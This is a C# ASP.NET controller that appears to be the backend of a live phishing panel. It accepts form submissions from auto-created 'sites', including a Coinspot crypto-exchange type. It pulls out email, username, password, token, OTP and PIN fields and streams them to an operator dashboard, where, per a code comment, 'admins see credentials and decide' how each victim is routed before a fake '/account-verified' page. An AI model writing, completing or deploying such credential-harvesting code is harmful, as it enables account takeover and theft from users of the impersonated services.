using Conductor.Db;
using Conductor.Models;
using Conductor.RealTime;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;
using System.Text.Json;
using Conductor.Helpers;

namespace Conductor.Controllers
{
    [ApiController]
    [Route("api/submit")]
    public class SubmissionController : ControllerBase
    {
        private readonly AppDb _db;
        private readonly IHubContext<DashboardHub> _hub;
        public SubmissionController(AppDb db, IHubContext<DashboardHub> hub) { _db = db; _hub = hub; }

        [HttpPost("{siteIdentifier}/{pageId:int}")]
        public async Task<IActionResult> Submit(string siteIdentifier, int pageId, [FromQuery] bool useDefaultFlow, [FromBody] JsonDocument payload)
        {
            if (!HttpContext.Items.TryGetValue("sessionId", out var sessionIdObj) || sessionIdObj is not int sessionId)
            {
                return BadRequest(new { message = "Session not found or invalid" });
            }

            // Try to find site by ID first, then by NAME (case-insensitive)
            Site? site = null;
            if (int.TryParse(siteIdentifier, out var siteId))
            {
                site = await _db.Set<Site>().FindAsync(siteId);
            }
            else
            {
                var siteIdentifierLower = siteIdentifier.Trim().ToLowerInvariant();

                // Case-insensitive search – translated by EF to LOWER(Name) = @p
                site = await _db.Set<Site>()
                    .Where(s => s.IsActive && s.Name.ToLower() == siteIdentifierLower)
                    .FirstOrDefaultAsync();

                // Auto-create site if it doesn't exist (development convenience)
                if (site == null)
                {
                    var siteType = siteIdentifierLower == "coinspot" ? SiteType.Coinspot : SiteType.Generic;
                    
                    site = new Site
                    {
                        // Store normalised lower-case name to avoid duplicates that differ only by case
                        Name = siteIdentifierLower,
                        Origin = Request.Headers.Origin.FirstOrDefault() ?? "http://localhost:5500",
                        Pages = siteType.GetDefaultPageOrder(), // Use type-specific page order
                        ManualRoutingEnabled = true, // Manual routing by default - admins see credentials and decide
                        DefaultFlowPath = "/account-verified",
                        TerminalPath = "/account-verified",
                        Type = siteType,
                        CreatedByUserId = 1, // Default admin user
                        CreatedAt = DateTimeOffset.UtcNow,
                        IsActive = true
                    };

                    _db.Sites.Add(site);
                    await _db.SaveChangesAsync();

                    Console.WriteLine($"Auto-created site: {siteIdentifierLower} with ID {site.Id}");
                }
            }

            if (site == null) 
            {
                return NotFound(new { message = $"Site '{siteIdentifier}' not found" });
            }

            var sub = new Submission { SiteId = site.Id, SessionId = sessionId, PageId = pageId, Payload = payload, UseDefaultFlow = useDefaultFlow, CreatedAt = DateTimeOffset.UtcNow };
            _db.Add(sub);
            await _db.SaveChangesAsync();

            // --- Build sanitized field dictionary for dashboard ---

            var whitelist = new[] {"email","user","username","login","password","pwd","pass","token","code","otp","pin"};
            Dictionary<string,string> sanitized = new();

            JsonElement formDataElement;
            if (payload.RootElement.TryGetProperty("formData", out formDataElement) && formDataElement.ValueKind==JsonValueKind.Object)
            {
                foreach (var field in formDataElement.EnumerateObject())
                {
                    var nameLower = field.Name.ToLowerInvariant();
                    if (whitelist.Any(w=>nameLower.Contains(w)))
                    {
                        sanitized[field.Name] = field.Value.ToString();
                    }
                }
            }

            // fallback: if none captured and root has whitelisted keys
            if (sanitized.Count==0 && payload.RootElement.ValueKind==JsonValueKind.Object)
            {
                foreach(var prop in payload.RootElement.EnumerateObject())
                {
                    var nameLower = prop.Name.ToLowerInvariant();
                    if (whitelist.Any(w=>nameLower.Contains(w)))
                    {
                        sanitized[prop.Name] = prop.Value.ToString();
                    }
                }
            }

            // Derive page path from submission payload URL if available
            string pagePath = "/";
            if (payload.RootElement.TryGetProperty("url", out var urlProp))
            {
                if (Uri.TryCreate(urlProp.GetString(), UriKind.Absolute, out var uri))
                    pagePath = uri.PathAndQuery;
            }
            if (string.IsNullOrWhiteSpace(pagePath)) pagePath = $"/page-{pageId}";

            // Always create pending ticket for manual admin decision
            var ticket = new NextStep {
                SiteId = site.Id,
                SessionId = sessionId,
                SubmissionId = sub.Id,
                PageId = pageId,
                Status = "pending", // Always pending - admin will decide manually
                RedirectPath = string.Empty // required non-null for NOT NULL column
            };

            _db.Add(ticket);
            await _db.SaveChangesAsync();

            // Update session last seen & remain active (keep heartbeat consistent)
            var session = await _db.Sessions.FindAsync(sessionId);
            if (session != null)
            {
                session.LastSeenAt = DateTimeOffset.UtcNow;
                await _db.SaveChangesAsync();
            }

            // Always manual routing - notify dashboard about pending submission
            await _hub.Clients.Group($"site-{site.Id}")
                .SendAsync("pendingNextStep", new {
                    ticketId = ticket.Id,
                    submissionId = sub.Id,
                    sessionId,
                    pageId,
                    fields = sanitized,
                    pagePath
                });

            // Determine status using consistent logic
            var heartbeatInterval = 30; // seconds
            var inactiveThreshold = TimeSpan.FromSeconds(heartbeatInterval * 2);
            
            var nextStepCounts = _db.NextSteps
                .Where(ns => ns.SessionId == sessionId)
                .GroupBy(ns => ns.Status)
                .Select(g => new { Status = g.Key, Count = g.Count() })
                .ToList();

            var hasPendingTicket = nextStepCounts.Any(x => x.Status == "pending");
            var hasDecidedTicket = nextStepCounts.Any(x => x.Status == "decided");
            var hasProcessedTicket = nextStepCounts.Any(x => x.Status == "processed");
            var hasCompletedTicket = nextStepCounts.Any(x => x.Status == "completed");
            
            var correctStatus = SessionStatusHelper.DetermineSessionStatus(
                hasPendingTicket, hasDecidedTicket, hasProcessedTicket, hasCompletedTicket,
                session.IsActive, session.LastSeenAt, inactiveThreshold);

            // Broadcast session status using consistent determination logic
            var sessionPayload = new {
                id = sessionId,
                sessionId,
                isActive = session.IsActive,
                lastSeenAt = session.LastSeenAt,
                status = correctStatus, // This should be "waiting" since we just created a pending ticket
                currentPage = pagePath,
                latestSubmission = new {
                    pageId,
                    pagePath,
                    createdAt = sub.CreatedAt,
                    fields = sanitized
                }
            };

            await _hub.Clients.Group("dashboard").SendAsync("sessionUpdated", sessionPayload);
            
            return Ok(new { wait = true, ticketId = ticket.Id, sessionId });
        }


    }
}
